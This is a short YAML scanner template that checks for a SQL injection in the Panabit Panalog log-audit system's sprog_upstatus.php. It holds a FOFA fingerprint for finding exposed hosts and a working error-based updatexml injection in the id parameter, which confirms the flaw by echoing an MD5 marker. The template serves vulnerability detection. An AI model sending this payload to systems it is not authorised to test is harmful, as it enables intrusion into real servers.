id: poc-yaml-panalog-sprog-upstatus-php-sqli
info:
  name: Panalog 日志审计系统 sprog_upstatus.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: Panabit Panalog
  fofa: body="Maintain/cloud_index.php"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /Maintain/sprog_upstatus.php?status=1&rdb=1&id=1%20and%20updatexml(1,concat(0x7e,md5({{.t1}}),0x7e),1)
  expression: 'status_code == 200 &&

    contains(body,"XPATH syntax error") &&

    contains(body,substr(t2,0,31)) &&

    !contains(body,"<")

    '
transport: http
